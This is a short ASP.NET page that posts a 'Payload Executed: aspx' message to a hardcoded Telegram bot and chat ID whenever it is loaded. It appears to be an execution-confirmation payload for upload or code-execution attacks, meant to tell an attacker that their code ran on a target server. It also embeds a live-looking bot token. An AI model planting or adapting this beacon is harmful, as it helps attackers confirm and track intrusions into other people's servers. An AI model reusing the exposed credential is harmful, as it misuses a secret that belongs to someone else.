<%@ Page Language="C#" %>

<!DOCTYPE html>
<html>
<head>
    <title>Send Telegram Message</title>
</head>
<body>
    <h1>Sending Message...</h1>
    <%
        // Replace with your bot token and chat ID
        string botToken = "8128117790:AAHhKWnFTuk4DIeFsl1xyBiUsYxovpzm-_w";
        string chatId = "817280214";
        string message = "Payload Executed: aspx";

        // Telegram API URL
        string apiUrl = $"https://api.telegram.org/bot{botToken}/sendMessage";

        // Prepare the data
        string postData = $"chat_id={chatId}&text={Uri.EscapeDataString(message)}";

        try
        {
            // Create a web request
            System.Net.WebRequest request = System.Net.WebRequest.Create(apiUrl);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";

            // Write the data to the request stream
            byte[] dataBytes = System.Text.Encoding.UTF8.GetBytes(postData);
            request.ContentLength = dataBytes.Length;
            using (System.IO.Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(dataBytes, 0, dataBytes.Length);
            }

            // Get the response
            using (System.Net.WebResponse response = request.GetResponse())
            using (System.IO.StreamReader reader = new System.IO.StreamReader(response.GetResponseStream()))
            {
                string result = reader.ReadToEnd();
                Response.Write($"<p>Message sent successfully: {result}</p>");
            }
        }
        catch (Exception ex)
        {
            // Handle errors
            Response.Write($"<p>Error sending message: {ex.Message}</p>");
        }
    %>
</body>
</html>
